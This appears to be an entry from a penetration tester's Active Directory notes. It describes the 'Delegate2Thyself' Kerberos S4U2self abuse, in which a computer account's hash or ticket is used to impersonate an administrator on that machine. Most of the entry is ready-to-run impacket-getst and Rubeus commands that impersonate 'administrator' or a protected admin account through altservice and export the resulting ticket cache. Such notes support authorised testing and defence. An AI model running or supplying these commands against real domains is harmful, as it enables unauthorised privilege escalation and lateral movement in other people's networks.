---
title: Delegate2Thyself
---

Powered by [[notes/ad/kerberos-s4u2self]].

With the NT hash or TGT of a computer account impersonate an admin against the computer ([source](https://twitter.com/snovvcrash/status/1576176707270479873)).
This does not work with users that are member of the *Protected Users* group or have the *This account is sensitive and can not be delegated* flag.

=== "[[notes/tools/impacket]]"
    Requires [PR 1202](https://github.com/SecureAuthCorp/impacket/pull/1202).

    ~~~ bash
    impacket-getst -impersonate administrator -self -spn cifs/srv01.corp.local -k -no-pass 'corp.local/srv01$'
    export KRB5CCNAME=$PWD/administrator.ccache
    ~~~

You can impersonate protected admins by specifying an `altservice` ([source](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-impersonate-protecte)).
Or you can impersonate privileged computers like Domain Controllers.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-getst -impersonate jdoeadm -self -altservice cifs/srv01.corp.local -k -no-pass 'corp.local/srv01$'
    export KRB5CCNAME=$PWD/jdoeadm.ccache
    ~~~

=== "[[notes/tools/rubeus]]"
    ~~~ bat
    .\rubeus.exe s4u /nowrap /impersonateuser:jdoeadm /self /altservice:cifs/srv01.corp.local /user:srv01$ /aes256:%key%
    ~~~

References:

- [Revisiting Delegate 2 Thyself](http://web.archive.org/web/20220823203349/https://exploit.ph/revisiting-delegate-2-thyself.html)
